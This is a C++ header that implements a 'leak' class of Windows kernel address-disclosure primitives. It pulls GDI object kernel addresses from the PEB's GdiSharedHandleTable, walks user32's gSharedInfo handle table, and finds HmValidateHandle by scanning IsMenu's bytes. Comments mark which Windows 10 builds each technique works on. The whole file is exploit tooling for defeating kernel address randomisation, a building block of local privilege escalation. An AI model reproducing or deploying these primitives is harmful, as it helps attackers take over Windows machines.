#pragma once
#include<windows.h>

/*

Microsoft_Code_Name	Windows_10_Version	Microsoft_Marketing_Name	 Release_Date
Threshold 1 (TH1)         1507                  ------                July 2015
Threshold 2 (TH2)         1511	                ------                November 2015
Redstone 1  (RS1)         1607	           Anniversary Update	      August 2016
Redstone 2  (RS2)         1703	           Creators Update	          April 2017
Redstone 3  (RS3)         1709	           Fall Creators Update	      October 2017
Redstone 4  (RS4)         1803	           April 2018 Update	      April 2018

*/






typedef enum _HANDLE_TYPE
{
	TYPE_FREE = 0,
	TYPE_WINDOW = 1,
	TYPE_MENU = 2,
	TYPE_CURSOR = 3,
	TYPE_SETWINDOWPOS = 4,
	TYPE_HOOK = 5,
	TYPE_CLIPDATA = 6,
	TYPE_CALLPROC = 7,
	TYPE_ACCELTABLE = 8,
	TYPE_DDEACCESS = 9,
	TYPE_DDECONV = 10,
	TYPE_DDEXACT = 11,
	TYPE_MONITOR = 12,
	TYPE_KBDLAYOUT = 13,
	TYPE_KBDFILE = 14,
	TYPE_WINEVENTHOOK = 15,
	TYPE_TIMER = 16,
	TYPE_INPUTCONTEXT = 17,
	TYPE_HIDDATA = 18,
	TYPE_DEVICEINFO = 19,
	TYPE_TOUCHINPUTINFO = 20,
	TYPE_GESTUREINFOOBJ = 21,
	TYPE_CTYPES,
	TYPE_GENERIC = 255
} HANDLE_TYPE, * PHANDLE_TYPE;


typedef struct _GdiCell
{
	PVOID pKernelAddress;
	UINT16 wProcessIdl;
	UINT16 wCount;
	UINT16 wUpper;
	UINT16 uType;
	PVOID pUserAddress;
}GdiCell, * pGdiCell;

typedef struct _HandleEntry
{
	PULONG_PTR phead;
	PULONG_PTR pOwner;
	BYTE	   bType;
	BYTE	   bFlalgs;
	USHORT	   wUniq;
}HandleEntry, * pHandleEntry;

typedef struct _tagServerInfo
{
	ULONG dwSRVIFlags;
	ULONG_PTR cHandleEntries;
	//...
}tagServerInfo, * ptagServerInfo;

typedef struct _tagSharedInfo
{
	ptagServerInfo psi;
	pHandleEntry   aheList;
	//...
}tagSharedInfo, * PtagSharedInfo;


using _xxxHmValidateHandle = PVOID(__fastcall*)(HANDLE hwnd, HANDLE_TYPE handleType);






class leak
{
public:
	leak();	
	~leak() {};
	PVOID GetGdiKernelAddress(HANDLE hGdi);											 // RS1之前可用，用于GDI Object
	PVOID GetUserObjectAddressBygSharedInfo(HANDLE hWnd,PULONG_PTR UserAddr);	     // RS2之前可用，用于User Obejct
	_xxxHmValidateHandle HmValidateHandle;				     // RS4之前可用，返回在用户层映射的地址，用于User Object，可以根据heap->pSelf找到内核地址
    ULONG_PTR g_DeltaDesktopHeap;

private:
	void GetGdiSharedHandleTable();					
	void Get_gSharedInfo_ulClientDelta();
	void GetXXXHmValidateHandle();				    
	
private:
	pGdiCell GdiSharedHandleTable;
	PtagSharedInfo gSharedInfo;

};




leak::leak() 
{
	GetXXXHmValidateHandle();
	GetGdiSharedHandleTable();
	Get_gSharedInfo_ulClientDelta();
}

void leak::GetXXXHmValidateHandle()
{

	auto hModule = LoadLibrary(L"user32.dll");
	auto func = GetProcAddress(hModule, "IsMenu");
	for (size_t i = 0; i < 0x1000; i++)
	{
		BYTE* test = (BYTE*)func + i;
		if (*test == 0xE8)
		{
#ifdef _AMD64_
			ULONG_PTR tmp = (ULONG_PTR)((ULONG_PTR) * (PULONG)(test + 1) | 0xffffffff00000000);
#else
			ULONG_PTR tmp = (ULONG_PTR)* (PULONG)(test + 1);
#endif 
			HmValidateHandle = (_xxxHmValidateHandle)(test + tmp + 5);
			break;
		}
	}
	return ;
}

void leak::GetGdiSharedHandleTable()
{
	PULONG_PTR teb = (PULONG_PTR)NtCurrentTeb();

#ifdef _AMD64_
	PULONG_PTR  peb = *(PULONG_PTR*)((PBYTE)teb + 0x60);
	GdiSharedHandleTable = (pGdiCell)*(PULONG_PTR*)((PBYTE)peb + 0xf8);
#else
	PULONG_PTR  peb = *(PULONG_PTR*)((PBYTE)teb + 0x30);
	GdiSharedHandleTable = (pGdiCell)*(PULONG_PTR*)((PBYTE)peb + 0x94);
#endif

	return;
}

void leak::Get_gSharedInfo_ulClientDelta()
{
	auto pMenu = CreateMenu();

	/* get g_DeltaDesktopHeap */
	ULONG_PTR Teb = (ULONG_PTR)NtCurrentTeb();
#ifdef _AMD64_
	g_DeltaDesktopHeap = *(ULONG_PTR*)(Teb + 0x800 + 0x28);   //teb->Win32ClientInfo.ulClientDelta
#else
	g_DeltaDesktopHeap = *(ULONG_PTR*)(Teb + 0x6CC + 0x1C);
#endif 
															
	auto hModule = GetModuleHandleW(L"user32.dll");
	gSharedInfo = reinterpret_cast<PtagSharedInfo>(GetProcAddress(hModule, "gSharedInfo"));

	DestroyMenu(pMenu);
}

PVOID leak::GetGdiKernelAddress(HANDLE hGdi)
{
	return (GdiSharedHandleTable + LOWORD(hGdi))->pKernelAddress;
}

PVOID  leak::GetUserObjectAddressBygSharedInfo(HANDLE hWnd, PULONG_PTR UserAddr)
{
	PVOID ret = nullptr;
	pHandleEntry tmp = nullptr;

	for (ULONG_PTR i = 0; i < gSharedInfo->psi->cHandleEntries; i++)
	{
		tmp = gSharedInfo->aheList + i;
		HANDLE handle = reinterpret_cast<HANDLE>(tmp->wUniq << 0x10 | i);
		if (handle == hWnd)
		{
			ret = tmp->phead;
			if (UserAddr != NULL)
			{
				*UserAddr = (ULONG_PTR)ret - g_DeltaDesktopHeap;
			}
		}
	}

	return ret;
}
